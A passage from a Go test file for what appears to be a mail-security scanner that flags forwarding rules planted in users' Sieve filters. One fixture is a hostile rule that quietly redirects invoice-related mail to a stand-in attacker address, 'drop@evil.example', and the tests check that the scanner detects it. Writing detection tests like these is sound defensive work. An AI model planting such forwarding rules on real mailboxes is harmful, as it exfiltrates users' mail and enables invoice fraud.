				return []byte("example.com\n"), nil
			case scriptPath:
				return []byte(body), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	cfg.EmailProtection.PasswordCheckIntervalMin = 1440
	ctx := ContextWithAccountScope(context.Background(), "victim")
	findings := CheckMailFilters(ctx, cfg, nil)
	if len(findings) != 1 || findings[0].Check != "email_filter_forwarder" {
		t.Fatalf("account scan was throttled by host baseline: %+v", findings)
	}
	if hash, ok := db.GetForwarderHash("mailsieve:" + scriptPath); !ok || hash != sha256Hex([]byte(body)) {
		t.Fatalf("account scan hash = %q, %v; want current Sieve hash", hash, ok)
	}
	if got := db.GetMetaString("email:mailfilter_last_refresh"); got != mailBaseline {
		t.Fatalf("account scan changed shared mail-filter marker from %q to %q", mailBaseline, got)
	}
	if got := db.GetMetaString("email:mailsieve_last_refresh"); got != sieveBaseline {
		t.Fatalf("account scan changed shared Sieve marker from %q to %q", sieveBaseline, got)
	}
}

func TestCheckMailFiltersUpgradeBaselinesExistingSieve(t *testing.T) {
	db := withTestStore(t)
	if err := db.SetMetaString("email:mailfilter_last_refresh", time.Now().Format(time.RFC3339)); err != nil {
		t.Fatal(err)
	}
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	scriptPath := "/home/victim/mail/example.com/box/sieve/roundcube.sieve"
	body := `if header :contains "subject" "invoice" { redirect "partner@external.example"; }`

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve") {
				return []string{scriptPath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{scriptPath: now}),
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\n"), nil
			case scriptPath:
				return []byte(body), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	cfg.EmailProtection.PasswordCheckIntervalMin = 1440
	if findings := CheckMailFilters(context.Background(), cfg, nil); len(findings) != 0 {
		t.Fatalf("upgrade treated pre-existing Sieve rule as newly planted: %+v", findings)
	}
	if got := db.GetMetaString("email:mailsieve_last_refresh"); got == "" {
		t.Fatal("complete upgrade scan did not establish Sieve baseline")
	}

	body = `if header :contains "subject" "invoice" { redirect "drop@evil.example"; }`
	previousForceAll := ForceAll
	ForceAll = true
	t.Cleanup(func() { ForceAll = previousForceAll })
	findings := CheckMailFilters(context.Background(), cfg, nil)
	if len(findings) != 1 || findings[0].Check != "email_filter_forwarder" {
		t.Fatalf("post-baseline Sieve change was not detected: %+v", findings)
	}
}
